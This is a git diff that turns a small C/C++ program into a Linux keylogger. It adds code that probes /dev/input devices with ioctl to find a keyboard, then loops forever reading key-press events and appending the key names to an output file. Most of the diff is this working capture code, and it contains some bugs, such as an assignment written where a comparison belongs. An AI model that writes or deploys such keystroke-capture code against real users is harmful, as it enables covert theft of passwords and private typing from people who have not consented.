@@ -5,7 +5,11 @@
 #include <sys/types.h>
 #include <sys/ioctl.h>
 #include <string>
+#include <dirent.h>
 #include <fcntl.h>
+#include <signal.h>
+#include <unistd.h>
+#include <string.h>
 
 
 
@@ -18,6 +22,35 @@ using namespace std;
 void show_usage_and_exit(char* char_pt){
     fprintf(stderr, "Usage: %s output_file\n", char_pt);
     exit(1);
+}
+
+void keylogger_init(int keyboard_fd, int outfd){
+    int event_size = sizeof(struct input_event);
+    int bytes_read = 0;
+    struct input_event events[128]; // replace 128 with NUM_EVENTS
+    int i;
+
+    // write signal handler for sigint etc
+
+    while(true){
+        bytes_read = read(keyboard_fd, events, event_size * 128);
+
+        for (int i = 0; i < (bytes_read/event_size); ++i){
+            if (events[i].type = EV_KEY){
+                if (events[i].value == 1){
+                    if (events[i].code > 0 && events[i].code < NUM_KEYCODES){
+                        write_to_out(outfd, keycodes[events[i].code], keyboard_fd);
+                        write_to_out(outfd, "\n", keyboard_fd);
+                    } else {
+                        write(outfd, "UNRECOGNIZED\n", sizeof("UNRECOGNIZED\n"));
+                    }
+                }
+            }
+        }
+    }
+    if (bytes_read > 0){
+        write(outfd, "\n", keyboard_fd);
+    }
 }
 
 int is_keyboard_device(const struct dirent * file){
@@ -49,19 +82,32 @@ char * obtain_event_file(){
 
             snprintf(filename, sizeof(filename), "%s%s", "/dev/input", event_files[i]->d_name);
             
-            fstream keyboard;
-            int keyboard_fd = open(filename, O_RDONLY);
-            keyboard.open(filename, ios::in);
-            if (!keyboard){
-                fprintf(stderr, "No keyboard device connected\n");
+            int keyboard_fd = open(filename,O_RDONLY);
+
+            if (keyboard_fd < 0){
+                perror("open");
                 exit(1);
             }
 
-            fstream f("file1", ios::in | ios::out);
-            ((filebuf *)(f.rdbuf()))->;
+            ioctl(keyboard_fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
+            if ((EV_KEY & event_bitmap) == event_bitmap){
+                // behaves like a keyboard
+                ioctl(keyboard_fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
+                if ((keyboard_bitmap & event_bitmap) == keyboard_bitmap){
+                    // device supports A, B, C, Z, so its probably a keyboard
+                    keyboard_file = strdup(filename);
+                    close(keyboard_fd);
+                    break;
+                }
+            }
 
         }
     }
+    for (int i = 0; i < num; i++){
+        free(event_files[i]);
+    }
+    free(event_files);
+    return keyboard_file;
 }
 
 int main(int argc, char ** argv){
@@ -77,18 +123,21 @@ int main(int argc, char ** argv){
         exit(1);
     }
 
-    fstream output_file;
-    output_file.open(argv[1], ios::app|ios::out);
-    // TODO: error check this call
+    int output_fd;
+    output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT);
+    if (output_fd < 0){
+        perror("output file: open");
+    }
 
-    fstream keyboard_file;
-    keyboard_file.open(keyboard_device, ios::in);
-    // TODO: error check this call 
+    int keyboard_fd = open(keyboard_device, O_RDONLY);
+    if (keyboard_fd < 0){
+        perror("keyboard file: open");
+    }
 
-    keylogger_init(keyboard_file, output_file);
+    keylogger_init(keyboard_fd, output_fd);
 
-    output_file.close();
-    keyboard_file.close();
+    close(keyboard_fd);
+    close(output_fd);
     free(keyboard_device);
 
     return 0;
